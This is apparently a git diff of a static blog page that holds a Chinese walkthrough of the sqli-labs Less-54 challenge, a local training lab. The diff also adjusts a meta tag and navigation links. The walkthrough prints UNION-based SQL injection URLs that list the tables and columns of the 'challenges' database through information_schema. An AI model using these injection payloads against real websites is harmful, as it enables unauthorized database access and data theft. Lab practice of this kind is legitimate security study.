@@ -184,7 +184,8 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <h1 id="Sqli-labs实验Task4（less54-65）"><a href="#Sqli-labs实验Task4（less54-65）" class="headerlink" title="Sqli-labs实验Task4（less54-65）"></a>Sqli-labs实验Task4（less54-65）</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>Page 4又是不一样的挑战：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a1cffad6074984f6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"><br>可以看到这一串英文的提示是告诉我们需要在不到10次尝试中从数据库challenges中的随机表中获取秘钥，有趣的是，每次都会重置，challenge都会产生随机的表名、列名、表数据。一直保持新鲜。<br>分析分析可以知道，这个和ctf差不多，我们需要获取flag来提交才算成功。<br>首先第一次判断闭合情况，一次成功，单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=1’</span><br></pre></td></tr></table></figure></p>
+                <p><meta name="referrer" content="no-referrer"></p>
+<h1 id="Sqli-labs实验Task4（less54-65）"><a href="#Sqli-labs实验Task4（less54-65）" class="headerlink" title="Sqli-labs实验Task4（less54-65）"></a>Sqli-labs实验Task4（less54-65）</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>Page 4又是不一样的挑战：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a1cffad6074984f6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"><br>可以看到这一串英文的提示是告诉我们需要在不到10次尝试中从数据库challenges中的随机表中获取秘钥，有趣的是，每次都会重置，challenge都会产生随机的表名、列名、表数据。一直保持新鲜。<br>分析分析可以知道，这个和ctf差不多，我们需要获取flag来提交才算成功。<br>首先第一次判断闭合情况，一次成功，单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=1’</span><br></pre></td></tr></table></figure></p>
 <p>知道数据库名是challenges，下面获取表名：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://upload-images.jianshu.io/upload_images/6269327-a6241fcbf6640597.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"><br>获取了表名，果然是随机产生的，现在获取字段：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,column_name from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://upload-images.jianshu.io/upload_images/6269327-06ae708b48b40d3c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"><br>可以看到第一个字段是id，还是直接获取所有列名把，有点蠢，以为一次就能出：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
@@ -214,13 +215,9 @@
 
                 <ul class="pager">
                     
-                    <li class="previous">
-                        <a href="/2019/04/15/21. PCI-DSS(V3.2.1)学习笔记(八)/" data-toggle="tooltip" data-placement="top" title="PCI-DSS(V3.2)学习笔记(八)">&larr; Previous Post</a>
-                    </li>
-                    
                     
                     <li class="next">
-                        <a href="/2019/04/15/19. PCI-DSS(V3.2.1)学习笔记(六)/" data-toggle="tooltip" data-placement="top" title="PCI-DSS(V3.2)学习笔记(六)">Next Post &rarr;</a>
+                        <a href="/2019/04/15/29.python3 windows校园网自动拨号/" data-toggle="tooltip" data-placement="top" title="python3 windows校园网自动拨号">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
